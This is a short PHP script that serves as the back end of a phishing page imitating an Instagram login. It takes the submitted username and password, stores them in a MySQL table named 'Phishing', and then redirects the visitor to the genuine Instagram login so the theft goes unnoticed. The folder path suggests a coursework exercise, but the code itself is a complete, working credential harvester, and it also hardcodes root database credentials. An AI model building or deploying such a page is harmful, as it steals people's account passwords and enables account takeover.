<?php 
    $servername = "localhost";
    $username = "root";
    $password = "root";
    $bd = "bd-phishing";

    $conn = new mysqli($servername, $username, $password, $bd);

    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    $nombre = $_POST["usuario"];
    $contrasenya = $_POST["pass"];
    $nombre = mysqli_real_escape_string ($conn, $nombre);
    $contrasenya = mysqli_real_escape_string ($conn, $contrasenya);

    $post = (isset($_POST['usuario']) && !empty($_POST['usuario'])) && (isset($_POST['pass']) && !empty($_POST['pass']));

    if ($post) {
        $sqlinsert = 'INSERT INTO Phishing (Nombre, Pass) VALUES ("' . $nombre . '", "'.$contrasenya.'");';
        $insertar = $conn->query($sqlinsert);
        if ($insertar === true) {
            header('Location: https://www.instagram.com/accounts/login/?hl=es&source=auth_switcher'); 
        }
    }
    else {
        header('Location: http://localhost/DAM/Phising/Phishing.php'); 
    }
?>